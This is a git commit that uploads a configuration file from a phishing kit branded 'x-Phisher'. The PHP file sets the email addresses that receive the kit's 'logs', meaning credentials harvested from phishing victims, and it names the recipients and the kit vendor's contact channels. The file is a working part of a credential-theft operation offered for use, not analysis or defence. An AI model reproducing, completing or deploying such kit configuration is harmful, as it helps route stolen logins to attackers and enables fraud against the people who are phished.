691f54fbc7594441957e2215f725db25621cc2e0
Racheal714 <92266253+Racheal714@users.noreply.github.com>
2023-05-02 23:10:32 +0100

    Add files via upload

---
+++ Your_email.php
@@ -0,0 +1,15 @@
+<?php 
+/*
+======================= Coded By x-Phisher ======================
+____  ___        __________.__    .__       .__                  
+\   \/  /        \______   \  |__ |__| _____|  |__   ___________ 
+ \     /   ______ |     ___/  |  \|  |/  ___/  |  \_/ __ \_  __ \
+ /     \  /_____/ |    |   |   Y  \  |\___ \|   Y  \  ___/|  | \/
+/___/\  \         |____|   |___|  /__/____  >___|  /\___  >__|   
+      \_/                       \/        \/     \/     \/       
+========================= xphisher.com ===========================
+*/
+
+/* Put your logs email here and for more help contact xphisher.pro@gmail.com or contact on live chat https://xphisher.com */
+$Your_Email = "cedricar@yandex.com,arlenecedric8@gmail.com";
+?>
